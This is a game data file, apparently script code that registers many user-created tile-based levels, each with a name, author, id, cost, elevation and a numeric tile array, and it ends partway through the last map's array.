maps.push({name="Sus",author="Spy Monkeh",id="#1693681435",direction="forward",cost=260,elevation=0,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,65,65,1,1,1,5,5,5,5,0,0,0,0,0,0,0,0,5,1,65,146,65,65,1,66,66,66,66,66,5,0,0,0,0,0,0,5,66,1,146,146,65,65,1,66,66,66,66,66,5,0,0,0,0,0,0,5,66,1,146,146,65,65,1,66,66,66,5,5,0,0,0,0,0,0,5,66,66,1,65,65,65,65,1,66,66,66,5,0,0,0,0,0,0,0,5,66,66,1,65,65,65,65,1,66,66,66,5,0,0,0,0,0,0,0,5,66,66,66,5,65,65,5,66,66,66,66,5,0,0,0,0,0,0,0,0,5,66,66,66,5,5,66,66,66,66,66,66,5,0,0,0,0,0,0,0,5,66,66,66,66,66,66,66,66,66,66,66,66,5,0,0,0,0,0,0,0,5,5,66,66,66,66,66,66,66,66,66,66,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,66,66,66,66,66,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,66,66,66,66,66,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0]});
maps.push({name="an apple a day",author="goober",id="#1693683374",direction="forward",cost=620,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,76,76,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,76,76,76,76,76,76,5,5,5,0,0,0,0,0,0,0,0,0,5,76,76,76,76,76,76,76,76,76,76,5,0,0,0,0,0,0,0,0,5,76,76,76,0,0,76,76,76,76,76,76,5,5,0,0,0,0,0,5,76,76,76,0,0,0,76,76,76,76,76,76,76,76,5,0,0,0,0,5,76,76,0,0,0,76,76,76,76,76,76,76,76,76,5,0,0,0,5,5,76,76,0,0,76,76,76,76,76,76,76,76,76,76,5,0,0,0,5,5,76,76,76,76,76,76,76,76,76,76,76,76,76,76,5,0,0,0,0,5,5,76,76,76,76,76,76,76,76,76,76,76,76,5,0,0,0,5,5,125,5,5,76,76,76,76,76,76,76,76,76,76,76,5,0,0,5,125,125,125,125,5,76,76,76,76,76,76,76,76,76,76,76,5,0,5,125,125,125,125,125,5,76,76,76,76,76,76,76,76,76,76,76,76,5,5,125,125,125,125,5,5,76,76,76,76,76,76,76,76,76,76,76,76,5,5,125,125,125,5,5,5,76,76,76,76,76,76,76,76,76,76,76,5,0,5,5,5,5,0,5,76,76,76,76,76,76,76,76,76,76,5,5,0,0,0,0,0,0,0,5,76,76,76,76,76,76,76,76,5,5,0,0,0,0,0,0,0,0,0,0,5,76,76,76,76,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,2,2,0,0,0,0,0,0]});
maps.push({name="Under the Sea v3",author="sivi",id="#1693693805",direction="right",cost=371,elevation=-9,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,34,34,34,0,0,0,0,5,90,5,5,0,0,0,0,34,90,34,1,1,34,34,34,34,1,5,5,5,5,132,5,1,0,0,1,34,134,34,1,1,0,34,90,34,185,5,90,5,5,5,5,0,0,0,0,34,34,90,1,1,0,0,34,185,185,185,5,5,5,1,0,0,0,0,34,34,34,34,1,1,0,1,5,185,185,185,185,1,0,0,0,0,0,34,34,90,34,34,1,1,0,5,5,5,185,34,34,0,0,0,0,0,1,34,34,34,34,0,1,1,5,5,90,5,34,90,34,0,0,0,0,0,34,90,34,34,1,0,1,1,5,5,5,1,34,34,34,1,0,0,0,0,34,34,34,0,0,0,1,1,90,5,5,0,34,34,34,90,5,5,0,0,34,34,34,1,5,5,105,1,5,5,5,0,34,34,34,5,137,5,1,0,34,90,34,5,90,9998,2,1,5,5,5,1,34,90,34,5,5,5,5,0,34,34,185,5,5,9998,2,1,5,90,5,0,34,34,34,90,5,5,5,5,185,185,185,5,5,0,1,1,5,5,5,0,34,34,34,1,5,5,90,5,185,185,185,185,1,0,1,1,5,133,5,1,34,34,34,0,0,5,5,5,185,185,185,34,34,0,1,1,90,5,5,34,90,34,34,0,0,1,5,5,5,185,34,90,34,34,1,1,34,34,34,34,34,34,1,0,0,0,0,0,0,1,34,34,34,90,1,1,90,131,34,34,34,0,0,0,0,145,0,0,0,0,0,34,136,34,1,1,34,34,90,34,1,0,0,0,154,33,153,157,0,0,0,34,90,34,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="BounceTown USA",author="goober",id="#1693718596",direction="right",cost=380,elevation=0,map=[0,2,2,0,1,1,1,0,0,67,65,121,94,93,121,21,21,21,21,0,0,121,121,0,1,1,0,0,0,67,65,21,121,121,21,65,65,21,21,21,0,121,121,0,1,1,0,125,0,0,67,65,21,21,65,67,67,65,21,2,0,121,121,0,1,1,0,0,0,0,0,67,65,65,67,0,67,65,21,2,0,121,121,1,1,1,0,0,0,125,0,0,67,67,0,0,67,65,21,21,67,65,21,21,1,1,1,0,0,0,0,0,0,0,0,67,65,121,121,1,67,65,21,21,96,131,1,0,0,0,0,125,0,0,67,65,121,99,1,1,67,65,21,21,1,1,1,0,0,0,0,0,0,0,67,65,121,121,1,1,0,67,65,65,65,1,0,1,0,0,125,0,0,0,67,65,121,134,1,1,0,0,67,67,67,67,0,0,1,0,0,0,0,0,0,67,65,121,121,1,125,0,0,0,0,0,0,0,1,0,0,0,0,125,0,67,65,65,21,21,0,0,125,0,125,0,125,0,1,0,0,0,0,0,0,0,67,65,21,21,0,0,0,0,0,0,0,0,0,1,0,0,125,0,0,0,67,65,65,21,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,67,65,65,0,125,0,0,0,125,0,0,1,1,1,0,0,0,125,0,0,0,67,67,0,0,0,125,0,0,0,67,1,133,1,67,0,0,0,0,125,0,0,0,0,0,0,0,0,0,67,65,121,98,1,65,67,0,0,0,0,0,0,0,0,0,0,0,0,67,65,121,121,121,1,121,65,67,0,125,0,125,0,1,0,0,0,0,67,65,121,97,121,121,121,121,65,67,0,0,0,0,0,1,0,0,0,67,65,121,132,121,121,121,121,121,65,67,0,0,0,1,1,1]});
maps.push({name="Cosette",author="Dogeeri",id="#1693726610",direction="forward",cost=493,elevation=-5,map=[1,1,189,24,95,95,24,24,24,0,0,0,0,0,0,0,0,2,2,18,0,152,24,24,95,24,24,90,24,0,0,0,0,0,0,0,0,18,18,18,0,16,186,1,1,24,24,24,72,72,72,0,0,0,0,0,0,0,18,18,16,16,16,1,90,23,22,66,66,66,66,73,73,73,0,0,0,0,18,3,93,127,94,1,22,22,22,22,66,66,66,73,73,66,67,0,0,0,58,24,16,76,16,199,56,56,22,89,22,66,66,73,73,66,67,0,188,24,58,24,76,75,76,1,22,56,56,22,22,22,66,73,73,73,0,0,24,94,58,24,75,76,75,1,56,56,56,56,56,22,22,66,73,0,0,0,0,24,58,24,76,75,76,1,56,94,56,56,22,22,22,66,73,0,0,0,0,18,18,18,75,76,75,1,56,94,56,56,56,22,90,1,1,0,0,0,0,17,17,17,76,76,76,1,1,1,1,1,1,1,1,91,91,1,1,1,1,17,91,17,75,75,75,1,87,65,65,65,90,14,101,1,1,91,144,91,1,16,16,16,75,65,65,14,65,65,65,65,65,14,101,14,90,1,1,1,1,16,16,90,75,75,65,65,65,65,14,14,65,14,101,14,14,14,14,15,15,95,16,1,77,75,65,65,65,65,14,14,14,101,101,14,14,14,0,0,15,15,15,1,77,75,13,65,14,14,14,0,0,0,0,0,0,0,40,40,0,15,15,1,1,13,13,13,13,13,13,0,0,0,0,0,40,40,40,20,4,15,15,1,1,90,13,13,95,13,90,0,0,0,0,0,40,102,40,40,1,1,144,1,1,13,13,95,100,95,0,0,0,0,0,0,40,40,40,24,24,23,125,15,1,2,2,13,91,0,0,0,0,0,0,0,0,126,40,24,93,24,15,145]});
maps.push({name="Flooded Village",author="sivi",id="#1693747822",direction="forward",cost=445,elevation=0,map=[1,1,1,1,1,1,1,1,106,2,2,1,1,1,1,1,1,1,1,0,1,12,12,9998,12,90,5,5,9998,9998,9998,5,5,90,12,9998,12,12,1,0,1,90,100,90,12,5,5,5,5,5,5,5,5,5,12,90,100,90,1,0,1,46,46,46,12,90,5,5,5,5,5,5,5,90,12,46,46,46,1,0,1,94,46,46,12,5,5,5,5,5,5,5,5,5,12,46,46,93,1,0,1,90,46,46,12,90,5,5,5,5,5,5,5,90,12,46,46,90,1,0,1,12,95,95,12,5,5,5,7,7,7,5,5,5,12,95,95,12,1,0,1,90,9998,9998,5,5,5,7,65,65,65,7,5,5,5,9998,9998,90,1,0,1,5,5,5,5,5,7,65,65,67,65,65,7,5,5,5,5,5,1,153,1,88,5,5,5,5,7,65,67,65,67,65,7,5,5,5,5,88,1,5,1,5,5,5,5,5,7,65,65,67,65,65,7,5,5,5,5,5,1,6,1,90,9998,9998,5,5,5,7,65,65,65,7,5,5,5,9998,9998,90,1,154,1,12,95,95,12,5,5,5,7,7,7,5,5,5,12,95,95,12,1,155,1,90,46,46,12,90,5,5,5,5,5,5,5,90,12,46,46,90,1,0,1,93,46,46,12,5,5,5,5,5,5,5,5,5,12,46,46,94,1,0,1,46,46,46,12,90,5,5,5,5,5,5,5,90,12,46,46,46,1,0,1,90,100,90,12,5,5,5,5,5,5,5,5,5,12,90,100,90,1,0,1,12,12,9998,12,90,5,5,9998,9998,9998,5,5,90,12,9998,12,12,1,0,1,1,1,1,1,1,1,1,106,9998,106,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,106,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Lava Valley",author="sivi",id="#1693762868",direction="left",cost=381,elevation=9,map=[1,1,105,105,2,2,105,105,105,1,1,1,1,1,1,1,1,1,1,1,1,0,5,5,5,5,5,90,5,0,14,90,14,14,14,14,14,14,14,1,1,0,0,90,5,5,5,5,0,0,14,14,14,0,77,77,0,14,90,1,1,14,0,0,5,5,5,0,0,14,90,14,0,0,0,0,0,14,14,1,1,93,14,0,5,90,5,0,90,14,14,14,141,5,90,88,0,0,14,1,1,14,0,0,5,5,0,0,14,14,14,14,141,5,5,5,5,141,14,1,1,14,0,5,5,5,0,94,14,90,14,14,141,5,5,90,5,141,14,1,1,183,0,90,5,5,0,0,14,14,14,90,0,0,5,5,0,0,14,1,1,77,0,5,5,90,0,77,14,14,14,14,14,0,5,5,0,94,14,1,1,77,0,88,5,5,0,0,90,14,14,14,0,0,90,5,0,0,14,1,1,183,0,5,5,5,0,14,14,14,90,14,77,0,5,5,5,0,14,1,1,14,0,0,90,5,0,0,14,14,14,14,0,0,5,5,90,0,183,1,1,90,14,153,5,5,5,0,34,34,0,0,0,5,5,5,5,0,77,1,1,14,14,154,5,5,5,5,185,185,5,5,5,5,90,5,88,0,77,1,1,14,90,0,0,5,90,5,185,185,5,90,5,5,5,5,5,0,183,1,114,14,14,14,0,0,5,5,185,185,5,5,5,5,5,5,90,0,14,1,2,9998,14,14,14,0,0,0,34,34,0,0,5,90,88,5,0,0,14,1,2,9998,14,14,14,14,90,14,14,14,14,0,0,0,0,0,0,14,14,1,1,90,14,90,14,14,14,14,14,14,90,14,183,77,77,183,14,14,93,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Tower o Climb",author="goober",id="#1693767075",direction="right",cost=412,elevation=19,map=[1,1,0,0,0,67,67,0,1,0,0,0,67,2,2,1,1,1,0,0,1,0,0,0,67,65,65,67,0,0,0,67,65,5,5,1,1,0,0,0,0,0,5,1,1,5,5,65,67,0,1,67,65,5,5,1,0,0,1,0,0,5,5,105,105,5,5,65,65,67,67,67,65,5,5,0,0,0,0,0,5,5,5,105,105,5,5,5,65,65,65,65,65,5,5,0,0,0,0,0,5,5,5,1,1,5,5,5,5,5,5,5,5,5,5,0,1,0,0,1,141,5,141,1,1,1,1,5,5,5,5,5,5,5,5,0,0,0,1,1,14,14,14,1,1,1,1,96,5,94,5,93,5,1,1,1,0,0,1,1,14,14,14,0,0,1,1,131,1,1,1,1,1,1,1,1,0,0,24,2,14,14,14,67,0,0,1,1,1,1,1,1,1,1,0,0,0,0,24,2,65,114,114,65,67,0,0,1,1,1,1,1,0,0,0,22,23,24,24,24,67,65,114,114,65,67,0,0,1,1,1,1,0,0,22,22,23,24,24,24,0,67,65,114,114,65,67,0,0,1,1,1,1,22,22,22,23,24,24,24,0,0,67,65,14,14,65,0,0,0,1,132,122,22,22,22,0,0,1,1,0,0,67,65,14,14,14,141,22,22,122,122,122,122,22,65,67,0,1,1,0,0,67,65,114,14,14,14,22,122,122,97,122,122,65,67,0,0,0,1,0,67,65,114,114,114,14,141,22,22,122,122,122,65,67,0,0,0,0,0,67,65,14,14,114,114,114,0,0,67,65,122,122,22,65,67,0,0,1,0,24,24,4,14,14,114,65,67,0,0,67,65,22,22,22,65,67,0,0,0,93,24,4,14,14,65,67,0,0,0,0,67,65,22,94,22,65,67,0,0]});
maps.push({name="Simple and wet",author="Luffaren",id="#1693804455",direction="right",cost=615,elevation=19,map=[5,2,2,5,0,67,67,67,67,67,67,67,67,67,1,1,1,1,1,1,5,5,5,5,14,65,65,65,65,65,65,65,65,65,1,90,124,89,124,2,67,65,65,65,14,89,14,14,14,14,14,14,14,14,124,124,124,124,124,2,67,65,65,65,9998,14,14,93,48,93,48,93,48,14,1,90,97,124,124,1,67,65,65,65,96,48,48,48,94,48,94,48,94,14,124,124,124,124,89,1,67,65,65,65,14,14,14,14,14,14,14,14,14,14,1,90,124,124,124,1,67,65,65,65,9998,13,13,13,13,9998,15,15,15,15,1,1,95,95,1,1,67,65,65,65,14,12,12,12,12,14,16,16,16,16,24,24,24,24,65,67,67,65,65,65,14,11,11,11,11,14,17,17,17,17,24,24,89,24,65,67,67,65,65,65,14,10,10,10,10,14,18,18,18,18,24,24,24,24,65,67,67,65,65,65,14,9,9,9,9,14,19,19,19,19,24,89,24,24,65,67,67,65,65,65,14,8,8,8,8,14,20,20,20,20,24,24,24,24,65,67,67,65,65,65,14,7,7,7,7,14,21,21,21,21,24,24,24,24,65,67,67,65,65,65,14,6,6,6,6,14,22,22,22,22,24,24,89,24,65,67,67,65,65,65,90,5,5,5,5,14,23,23,23,23,9998,24,24,24,65,67,67,65,65,65,5,5,5,5,5,141,24,24,24,24,24,24,24,24,65,67,67,65,65,65,65,65,65,65,65,14,24,24,89,24,24,89,24,24,65,67,67,65,65,65,65,65,65,65,65,14,24,24,24,24,24,24,24,24,65,67,67,65,65,65,65,65,65,65,65,14,24,65,65,65,65,65,65,65,65,67,0,67,67,67,67,67,67,67,67,67,67,67,67,67,67,67,67,67,67,0]});
maps.push({name="Inside for trigger",author="Luffaren",id="#1693806336",direction="right",cost=356,elevation=-9,map=[14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,14,14,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,13,12,11,10,9,9,9,0,0,0,0,145,7,5,5,5,14,14,14,14,13,12,11,10,9,9,9,9,0,0,0,7,128,89,5,2,90,14,90,14,13,12,11,10,9,89,9,9,0,0,0,0,5,5,5,2,1,95,1,1,1,1,1,1,1,90,9,9,0,0,0,0,89,5,5,5,1,114,114,90,1,93,97,19,1,9,9,89,0,0,0,0,5,5,89,5,1,90,114,114,1,34,34,0,124,4,9,9,0,0,0,0,5,5,5,5,1,1,1,95,1,188,188,0,1,9,9,9,0,0,0,67,65,65,65,65,124,150,0,34,0,0,0,34,124,8,8,8,0,0,0,67,65,65,65,65,1,0,0,34,0,0,0,0,1,7,7,7,0,0,0,67,65,65,65,65,124,150,0,34,0,0,0,0,124,6,6,6,0,0,0,67,65,65,65,65,1,0,0,34,0,0,0,34,1,5,5,5,0,0,0,67,65,65,65,65,124,150,0,34,0,0,0,0,124,90,5,5,0,0,0,0,90,5,5,90,1,0,0,34,0,0,0,0,1,5,5,5,0,0,100,114,1,114,95,1,124,150,0,34,0,0,34,0,124,90,89,5,0,0,1,90,5,185,105,1,93,0,0,34,0,1,1,1,1,5,5,5,5,90,1,5,89,185,5,1,1,0,0,34,0,1,90,114,95,14,185,185,185,185,114,185,185,14,5,1,93,119,0,34,34,96,114,89,1,5,5,5,89,5,95,105,5,89,5,114,1,1,1,1,1,1,1,1,1,90,94,94,5,90,1,1,1,1,1,93]});
maps.push({name="Dont let Zs get em",author="Luffaren",id="#1693810456",direction="right",cost=281,elevation=-9,map=[14,14,2,2,14,14,0,0,0,0,0,0,0,0,0,0,94,5,94,5,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,5,94,5,94,14,14,14,14,14,14,0,0,0,77,0,0,0,77,0,0,94,5,94,5,14,14,14,14,14,14,14,0,77,14,77,0,77,9,77,0,5,94,5,94,13,13,13,13,13,13,0,0,0,77,0,0,0,77,0,0,94,5,94,5,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,5,94,5,94,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,93,5,94,5,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,5,93,5,5,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,93,5,127,127,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,90,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,1,1,1,90,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,105,105,1,90,5,5,5,5,5,5,5,5,5,5,5,5,5,5,90,1,105,105,5,5,5,5,5,5,5,5,5,5,5,89,5,5,2,5,1,1,1,5,5,5,5,5,5,5,5,5,89,5,5,5,5,5,2,1,1,1,90,5,5,5,5,5,5,5,5,5,5,5,5,5,89,5,5,1,1,90,5,5,5,5,5,5,5,5,5,5,5,89,5,5,5,5,89]});
maps.push({name="Humans better run",author="Luffaren",id="#1693813669",direction="right",cost=301,elevation=-19,map=[1,2,2,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,124,124,96,9998,5,65,65,0,0,0,0,0,0,0,0,0,0,0,0,1,94,124,96,9998,5,65,65,0,0,0,0,0,0,0,0,0,0,0,0,1,124,1,1,1,93,5,5,0,0,0,0,0,0,0,0,0,0,0,0,1,24,23,23,1,93,5,5,5,96,96,5,97,0,0,0,0,0,0,0,1,1,1,22,1,1,1,1,1,5,96,5,5,5,5,5,0,0,0,0,1,21,21,22,1,16,15,15,1,100,5,96,5,5,5,5,5,0,0,0,1,20,1,1,1,16,1,14,1,1,1,1,1,1,1,5,5,5,0,0,1,20,19,18,17,17,1,14,1,9,8,7,6,6,1,5,5,5,5,0,1,1,1,1,1,1,1,14,1,9,1,1,1,5,1,90,5,5,5,0,0,0,0,1,14,14,94,14,1,10,10,10,1,5,1,1,5,5,5,5,0,0,0,1,14,1,1,1,1,1,1,10,1,5,5,1,5,5,5,5,0,0,0,1,14,14,14,1,10,10,10,10,1,1,5,1,5,5,5,5,0,0,0,1,1,1,13,1,10,1,1,1,1,5,5,1,5,5,89,5,0,0,0,0,0,1,12,1,11,1,5,5,5,5,1,1,5,5,5,5,0,0,0,0,0,1,12,12,12,1,5,1,1,1,1,90,5,5,5,89,0,0,0,0,0,1,1,1,1,1,5,5,5,5,5,5,5,89,5,5,0,0,0,0,0,0,0,0,0,1,1,90,5,5,89,5,5,5,5,2,0,0,0,0,0,0,0,0,0,0,1,1,90,5,5,89,5,89,5,2,0,0,0,0,0,0,0,0,0,0,0,1,1,5,5,5,5,5,5,89]});
maps.push({name="Array of triggering",author="Luffaren",id="#1693814831",direction="forward",cost=428,elevation=0,map=[0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,90,9,9,90,1,1,1,1,1,1,1,1,1,97,9,94,9,9,91,109,9,9,9,9,109,91,9,9,94,9,97,1,1,1,1,1,1,1,1,1,90,9,9,90,1,1,1,1,1,1,1,1,1,97,9,94,9,9,91,109,9,9,9,9,109,91,9,9,94,9,97,1,1,1,1,1,1,1,1,1,90,9,9,90,1,1,1,1,1,1,1,1,1,97,9,94,9,9,91,109,9,9,9,9,109,91,9,9,94,9,97,1,1,1,1,1,1,1,1,1,90,9,9,90,1,1,1,1,1,1,1,1,1,97,9,94,9,9,91,109,9,9,9,9,109,91,9,9,94,9,97,1,1,1,1,1,1,1,1,1,109,109,109,109,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,96,96,96,96,1,1,1,1,1,1,1,1,1,100,9,93,89,9,91,109,9,9,9,9,109,91,9,89,93,9,100,1,1,1,1,1,1,1,1,1,90,9,9,90,1,1,1,1,1,1,1,1,1,100,9,93,89,9,91,109,9,9,89,9,109,91,9,89,93,9,100,1,1,1,1,1,1,1,1,1,90,9,9,90,1,1,1,1,1,1,1,1,1,100,9,93,89,9,91,109,9,89,9,9,109,91,9,89,93,9,100,1,1,1,1,1,1,1,1,1,90,9,9,90,1,1,1,1,1,1,1,1,1,100,9,93,89,9,91,109,9,9,89,9,109,91,9,89,93,9,100,1,1,1,1,1,1,1,1,1,90,9,9,90,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0]});
maps.push({name="Clear the way",author="Luffaren",id="#1693817616",direction="forward",cost=232,elevation=0,map=[0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,94,14,14,94,1,1,1,124,1,1,1,1,1,1,0,0,171,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,178,170,0,1,0,0,0,0,173,170,0,0,0,0,0,0,174,170,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,0,0,0,1,0,0,0,0,0,0,0,0,0,150,0,0,0,0,0,1,0,0,1,1,118,1,1,96,96,1,1,1,1,124,0,0,0,0,0,1,0,0,1,93,116,199,114,114,114,97,114,90,90,1,0,0,0,0,0,1,0,0,1,93,114,199,114,89,94,114,89,114,114,114,0,0,0,0,0,1,0,0,1,93,114,199,114,89,94,114,89,114,114,114,189,189,189,189,189,1,0,0,1,93,114,199,114,114,114,97,114,90,90,1,33,33,33,33,33,1,0,0,1,1,91,1,1,98,98,1,1,1,1,1,96,96,96,96,96,1,0,0,0,1,0,0,0,0,0,0,91,32,186,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,91,32,186,0,0,0,0,0,0,119,177,170,0,1,0,0,0,170,176,0,91,32,186,0,0,0,175,170,0,1,0,0,0,1,0,0,0,0,0,0,91,32,186,0,0,0,0,0,0,119,0,0,0,1,0,0,0,0,0,0,91,32,186,0,0,0,0,0,0,1,1,1,1,1,1,1,89,14,14,89,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger by pressure",author="Luffaren",id="#1693819500",direction="forward",cost=518,elevation=0,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,93,119,96,119,3,1,90,5,5,5,5,90,1,3,119,96,119,93,1,1,119,119,96,96,105,1,5,5,94,94,5,5,1,105,96,96,119,119,1,1,93,119,96,119,105,91,5,89,5,5,89,5,91,105,119,96,119,93,1,1,119,119,96,119,119,1,90,5,94,94,5,90,1,119,119,96,119,119,1,1,93,119,96,119,90,1,5,5,5,5,5,5,1,90,119,96,119,93,1,1,119,100,96,119,119,119,185,185,185,185,185,185,119,119,119,96,100,119,1,1,96,96,96,119,119,119,185,185,185,185,185,185,119,119,119,96,96,96,1,1,119,119,89,119,90,1,5,5,5,5,5,5,1,90,119,89,119,119,1,1,95,119,119,119,97,1,5,5,94,94,5,5,1,97,119,119,119,95,1,1,119,1,1,1,1,1,90,89,5,5,89,90,1,1,1,1,1,119,1,1,18,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,18,1,1,17,5,199,199,199,199,199,199,199,199,199,199,199,199,199,199,5,17,1,1,16,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,16,1,1,15,5,65,65,65,65,65,5,89,5,5,65,65,65,65,65,5,15,1,1,14,5,65,65,65,65,65,5,5,89,5,65,65,65,65,65,5,14,1,1,13,5,65,65,65,65,65,5,5,5,5,65,65,65,65,65,5,13,1,1,12,5,5,5,5,5,9998,5,89,5,5,9998,5,5,5,5,5,12,1,1,12,11,10,9,8,7,6,5,5,5,5,6,7,8,9,10,11,12,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1]});
maps.push({name="Dont move a muscle",author="Luffaren",id="#1693820048",direction="forward",cost=101,elevation=0,map=[0,2,2,0,0,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,0,0,199,0,0,0,129,0,0,0,0,0,0,127,0,0,0,0,0,0,0,0,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,0,0,0,0,0,0,126,0,0,0,0,0,0,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,0,0,0,0,0,0,0,0,129,0,0,0,0,0,0,126,0,0,0,199,65,65,65,65,5,186,0,0,0,0,0,0,0,0,0,0,0,0,0,199,65,65,65,65,5,186,0,0,0,0,0,0,0,0,0,0,0,0,0,199,65,65,65,65,5,186,0,0,0,0,0,0,0,0,0,0,0,0,0,199,65,65,65,65,5,186,0,0,0,0,0,0,0,0,0,199,199,199,199,199,89,2,2,89,5,186]});
maps.push({name="Chasm crossing",author="Luffaren",id="#1693821110",direction="forward",cost=420,elevation=-2,map=[0,0,0,0,0,0,0,24,2,2,24,90,24,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,44,24,90,24,94,24,94,24,94,90,24,24,44,0,0,0,0,0,90,24,24,24,24,89,24,24,24,24,24,24,89,24,90,44,0,0,0,44,24,90,24,90,24,24,24,24,24,89,24,24,24,24,24,0,0,0,0,0,5,5,185,5,5,5,3,3,5,24,24,24,24,5,5,93,0,0,0,0,5,5,90,5,90,5,5,5,5,5,5,24,5,90,5,5,5,0,0,67,161,65,65,5,5,5,5,5,5,5,5,185,5,5,5,5,5,0,67,161,65,65,5,5,94,5,5,90,5,5,5,185,5,5,0,0,0,0,0,5,5,5,131,5,5,90,5,5,65,65,5,185,5,0,0,0,0,0,0,5,5,5,132,5,5,5,65,65,65,65,162,67,67,67,67,67,0,0,67,161,161,161,161,5,5,65,65,65,162,162,162,162,162,162,162,162,67,0,67,161,161,161,161,161,65,65,5,5,5,5,5,185,5,5,5,162,162,67,0,5,5,5,5,5,5,5,5,5,5,5,5,185,5,5,5,5,162,67,0,0,5,5,5,93,5,5,5,5,5,5,5,22,5,5,93,5,5,0,0,0,22,22,22,22,5,141,141,141,5,22,22,22,22,22,5,5,0,0,0,93,22,22,22,22,22,22,22,22,22,22,22,89,22,22,22,0,0,0,0,0,90,22,22,22,89,22,22,89,22,89,22,22,22,22,22,3,0,0,0,0,0,0,90,22,22,22,22,22,22,22,22,22,90,22,42,0,0,0,0,0,0,0,0,22,2,2,22,22,90,22,90,22,42,0,0,0,0,0]});
maps.push({name="Buildings",author="sivi",id="#1693851424",direction="left",cost=429,elevation=0,map=[1,1,199,1,199,1,199,1,199,1,199,1,199,1,1,1,2,2,14,1,2,114,114,114,114,90,114,114,114,114,114,114,114,90,1,0,14,14,14,1,2,114,114,114,114,114,114,114,114,114,114,114,114,114,199,0,13,13,13,1,114,114,90,114,114,114,114,114,114,90,114,114,114,114,1,0,12,12,12,1,1,1,1,1,1,1,199,1,199,1,199,1,114,114,1,0,11,11,11,1,1,90,109,90,1,0,0,0,0,0,0,0,34,34,0,0,10,10,10,1,1,93,109,109,199,0,0,0,9,90,9,9,185,185,9,9,10,10,10,1,1,93,109,109,1,0,0,0,9,9,9,9,185,185,9,9,10,10,90,1,1,90,109,90,1,1,0,0,90,9,9,9,185,185,9,9,10,10,10,1,1,1,109,1,1,1,1,0,9,9,9,9,185,185,9,9,10,90,10,1,1,90,109,109,90,109,199,0,8,8,0,0,34,34,0,0,0,0,0,1,199,109,109,109,